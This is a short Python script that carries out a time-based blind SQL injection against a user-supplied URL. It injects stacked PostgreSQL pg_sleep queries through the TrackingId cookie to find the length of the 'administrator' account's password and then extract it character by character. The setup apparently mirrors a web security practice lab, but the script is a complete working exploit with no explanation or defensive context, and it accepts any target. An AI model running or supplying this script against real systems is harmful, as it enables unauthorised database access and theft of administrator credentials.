import requests

user_url = input("Please enter the URL With https://: ")
user_url = user_url.strip()
print(user_url)

try:
    response = requests.get(user_url)
    if response.status_code == 200:
        print(f"sucessfull the enter URL is {user_url}")
    else:
        print(f"The entered url is wrong {user_url}")

except requests.exceptions.RequestException as e:
    print(f"An error occurred. Make sure you entered a valid URL (including http:// or https://).\nError: {e}")

session = response.cookies.get("session")
tracking_id = response.cookies.get("TrackingId")
characters = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

# Length detection
counter = 0
while True:
    payload = f"{tracking_id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>{counter})+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
    cookies = {"TrackingId": payload, "session": session}
    response = requests.get(user_url, cookies=cookies)
    if response.elapsed.total_seconds() >= 5:
        counter += 1
        print(f"Password length is greater than {counter}")
    else:
        print(f"Password length is {counter}")
        break

# Character extraction (AFTER while loop)
for position in range(1, 21):
    for char in characters:
        payload = f"{tracking_id}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--"
        cookies = {
                        "TrackingId": payload,
                        "session": session
                      }
        response = requests.get(user_url, cookies=cookies)
        if response.elapsed.total_seconds() >= 5:
            password += char
            print(f"Position {position}: {char} → password so far: {password}")
            break

print(f"\nFull password: {password}")